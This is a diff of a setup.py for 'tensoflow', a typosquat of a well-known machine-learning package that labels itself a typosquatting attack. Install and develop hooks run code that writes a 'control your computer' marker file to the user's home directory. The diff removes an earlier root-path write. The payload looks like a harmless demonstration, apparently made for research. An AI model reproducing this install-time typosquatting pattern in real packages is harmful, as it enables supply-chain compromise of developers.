@@ -21,30 +21,16 @@ with open(long_description_filename) as fd:
     long_description = fd.read()
 
 FILENAME = 'typosquating-attack'
-ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
 USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
-USER = getpass.getuser()
 TIME = str(datetime.datetime.now())
 
 def touch_file():
-    try:
-        with open(ROOT_PATH, 'a') as root_fd:
-            message = 'Joan, Amine and Souhail control your computer now since {}'.format(
-                TIME
-            )
-            print(message)
-            root_fd.write(message + '\n')
-    except (IOError, OSError):
-        try:
-            with open(USER_PATH, 'a') as user_fd:
-                message = 'Joan, Amine and Souhail control your computer now since {}'.format(
-                    TIME
-                )
-                print(message)
-                user_fd.write(message + '\n')
-        except (IOError, OSError):
-            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
-            print('What kind of tricky system are you running this on?')
+    with open(USER_PATH, 'a') as user_fd:
+        message = 'Joan, Amine and Souhail control your computer now since {}'.format(
+            TIME
+        )
+        print(message)
+        user_fd.write(message + '\n')
 
 class PostDevelopCommand(develop):
     def run(self):
@@ -59,7 +45,7 @@ class PostInstallCommand(install):
 
 setup(
     name='tensoflow',
-    version='0.0.3',
+    version='0.0.4',
     description='A typosquatting attack under package name tensoflow.',
     long_description=long_description,
     long_description_content_type='text/markdown',
